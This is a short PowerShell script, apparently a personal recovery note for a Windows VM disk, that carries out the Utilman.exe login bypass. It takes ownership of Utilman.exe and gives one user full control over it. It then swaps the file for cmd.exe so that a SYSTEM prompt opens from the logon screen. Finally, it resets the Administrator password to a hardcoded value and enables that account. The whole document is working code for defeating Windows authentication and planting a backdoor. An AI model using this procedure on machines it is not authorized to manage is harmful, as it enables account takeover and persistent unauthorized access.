### replaces Utilman.exe with cmd.exe (for... stuff)

$file = "D:\Windows\System32\Utilman.exe"
$user = New-Object System.Security.Principal.NtAccount("tomica")
 
# replace the owner of Utilman.exe
$acl = Get-Acl -Path $file
$acl.SetOwner($user)
$acl | Set-Acl -Path $file
 
# add yourself the needed permissions
$acl = Get-Acl -Path $file
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule($user,"Full","Allow")
$acl.SetAccessRule($rule)
$acl | Set-Acl -Path $file
(Get-Acl -Path $file).Access | Format-Table IdentityReference,AccessControlType,FileSystemRights -AutoSize
 
# replace the Utilman.exe with cmd.exe (and move Utilman.exe to Utilman.exe.bak)
Move-Item -Path $file -Destination "$file.bak"
Copy-Item -Path "D:\Windows\System32\cmd.exe" -Destination "D:\Windows\System32\Utilman.exe"
 
# unmount disk, start the VM, use Accesibility Wizard icon on logon screen to start up the system/admin command prompt
 
# change password, enable local Administrator account
net user Administrator MyNewestPass123!
net user Administrator /active:yes
